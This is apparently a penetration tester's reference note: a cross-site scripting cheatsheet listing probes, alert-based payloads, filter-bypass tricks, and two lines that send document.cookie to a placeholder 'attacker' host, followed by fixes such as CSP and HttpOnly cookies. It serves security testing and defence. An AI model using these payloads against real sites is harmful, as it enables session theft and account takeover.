---
type: reference
category: Payloads
tags: [reference, payloads, web, xss]
---

# XSS (Cross-Site Scripting)

Standard XSS cheatsheet. No vault writeup fully backs this yet; the closest is the sanitization/CSP discussion in [[Cookie Security Protocol]] (where strict CSP blocked classic XSS and `/board` reflected under-sanitized input). Fill in with real cases as they come up.

## Detect (reflection probes)
```
<b>test</b>                does HTML render?
"><b>test</b>              break out of an attribute
'><b>test</b>
{{7*7}}                    if this evaluates, it's SSTI not XSS -> see [[SSTI]]
```

## Classic payloads
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
"><script>alert(document.domain)</script>
```

## Attribute / event-handler context
```
" onmouseover="alert(1)
' autofocus onfocus='alert(1)
javascript:alert(1)        (href / src sinks)
```

## Filter bypass
```html
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror=alert`1`>
<svg/onload=alert(1)>
<a href="javas&#99;ript:alert(1)">x</a>
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```

## Exfiltration (stored/reflected)
```html
<script>new Image().src='//attacker/?c='+document.cookie</script>
<script>fetch('//attacker/?c='+encodeURIComponent(document.cookie))</script>
```
Note: `HttpOnly` cookies are not readable from JS; and a strict CSP (`default-src 'none'`, nonce-only scripts) blocks most of the above (see [[Cookie Security Protocol]]).

## Fix
Context-aware output encoding, a strict CSP, and `HttpOnly`/`Secure` cookies. Treat all user input as untrusted at every sink.

## Related
- [[Web App Methodology]], [[Cookie Security Protocol]]
